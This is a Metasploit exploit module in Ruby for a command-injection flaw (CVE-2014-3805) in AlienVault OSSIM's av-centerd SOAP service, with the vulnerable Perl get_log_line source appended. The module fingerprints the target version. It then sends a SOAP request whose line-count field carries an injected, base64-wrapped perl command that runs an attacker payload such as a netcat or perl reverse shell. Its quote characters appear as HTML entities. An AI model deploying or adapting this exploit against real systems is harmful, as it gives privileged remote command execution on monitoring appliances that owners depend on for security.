require &#039;rexml/document&#039;
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include REXML
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;Alienvault OSSIM av-centerd Command Injection get_log_line&#039;,
            &#039;Description&#039;   => %q{
                This module exploits a command injection flaw found in the get_log_line
                function found within Util.pm. The vulnerability is triggered due to an
                unsanitized $r_file parameter passed to a string which is then executed
                by the system
            },
            &#039;Author&#039; => [ &#039;james fitts&#039; ],
            &#039;License&#039; => MSF_LICENSE,
            &#039;References&#039; =>
                [
                    [ &#039;CVE&#039;, &#039;2014-3805&#039; ],
                    [ &#039;OSVDB&#039;, &#039;107992&#039; ]
                ],
            &#039;Privileged&#039;    => true,
            &#039;Platform&#039;      => &#039;unix&#039;,
            &#039;Arch&#039;          => ARCH_CMD,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;SSL&#039; => true,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Compat&#039;    => {
                        &#039;RequiredCmd&#039;   => &#039;perl netcat-e openssl python gawk&#039;
                    }
                },
            &#039;DefaultTarget&#039; => 0,
            &#039;Targets&#039; =>
                [
                    [&#039;Alienvault <= 4.7.0&#039;,{}]
                ],
            &#039;DisclosureDate&#039; => &#039;Jul 18 2014&#039;))
 
            register_options([Opt::RPORT(40007)], self.class)
    end
 
    def check
        version = ""
        res = send_soap_request("get_dpkg")
 
        if res &&
            res.code == 200 &&
            res.headers[&#039;SOAPServer&#039;] &&
            res.headers[&#039;SOAPServer&#039;] =~ /SOAP::Lite/ &&
            res.body.to_s =~ /alienvault-center\s*([\d\.]*)-\d/
 
            version = $1
        end
 
        if version.empty? || version >= "4.7.0"
            return Exploit::CheckCode::Safe
        else
            return Exploit::CheckCode::Appears
        end
    end
 
    def build_soap_request(method)
        xml = Document.new
        xml.add_element(
            "soap:Envelope",
            {
                "xmlns:xsi"             => "http://www.w3.org/2001/XMLSchema-instance",
                "xmlns:soapenc"         => "http://schemas.xmlsoap.org/soap/encoding/",
                "xmlns:xsd"             => "http://www.w3.org/2001/XMLSchema",
                "soap:encodingStyle"    => "http://schemas.xmlsoap.org/soap/encoding/",
                "xmlns:soap"            => "http://schemas.xmlsoap.org/soap/envelope/"
            })
 
        body = xml.root.add_element("soap:Body")
        m = body.add_element(method, { &#039;xmlns&#039;  => "AV/CC/Util" })
 
        args = []
        args[0] = m.add_element("c-gensym3", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        args[0].text = "All"
 
        args[1] = m.add_element("c-gensym5", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        args[1].text = "423d7bea-cfbc-f7ea-fe52-272ff7ede3d2"
 
        args[2] = m.add_element("c-gensym7", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        args[2].text = "#{datastore[&#039;RHOST&#039;]}"
 
        args[3] = m.add_element("c-gensym9", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        args[3].text = "#{rand_text_alpha(4 + rand(4))}"
 
        args[4] = m.add_element("c-gensym11", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        args[4].text = "/var/log/auth.log"
 
        args[5] = m.add_element("c-gensym13", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
        perl_payload =  "system(decode_base64"
        perl_payload += "(\"#{Rex::Text.encode_base64(payload.encoded)}\"))"
        args[5].text = "1;perl -MMIME::Base64 -e &#039;#{perl_payload}&#039;;"
 
        xml.to_s
    end
 
    def send_soap_request(method, timeout=20)
        soap = build_soap_request(method)
 
        res = send_request_cgi({
            &#039;uri&#039;       => &#039;/av-centerd&#039;,
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;ctype&#039;     => &#039;text/xml; charset=UTF-8&#039;,
            &#039;data&#039;      => soap,
            &#039;headers&#039;   => {
                &#039;SOAPAction&#039;    => "\"AV/CC/Util##{method}\""
            }
        }, timeout)
 
        res
    end
 
    def exploit
        send_soap_request("get_log_line", 1)
    end
end
__END__
 
/usr/share/alienvault-center/lib/AV/CC/Util.pm
 
sub get_log_line {
        my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname, $r_file, $number_lines )
        = @_;
 
    verbose_log_file(
        "GET LOG LINE  : Received call from $uuid : ip source = $admin_ip, hostname = $hostname :($funcion_llamada,$r_file)"
    );
 
    my @ret = ("$systemuuid");
 
    if ( $r_file =~ /\.\./ ){
                        push(@ret,"File not auth");
                        return \@ret;
        }
 
        if ( $number_lines <= 0) {
                        push(@ret,"Error in number lines");
                        return \@ret;
        }
 
    if (( $r_file =~ /^\/var\/log\// ) or ( $r_file =~ /^\/var\/ossec\/alerts\// ) or ( $r_file =~ /^\/var\/ossec\/logs\// )){
                        if (! -f "$r_file" ){
                                push(@ret,"File not found");
                                return \@ret;
                        }
                        push(@ret,"ready");
 
                        my $command = "tail -$number_lines $r_file";
                        #push(@ret,"$command");
                        #my @content = `tail -$number_lines $r_file`;
                        my @content = `$command`;
                        push(@ret,@content);
                        return \@ret;
        }
    else {
                push(@ret,"path not auth");
                return \@ret;
        }
}

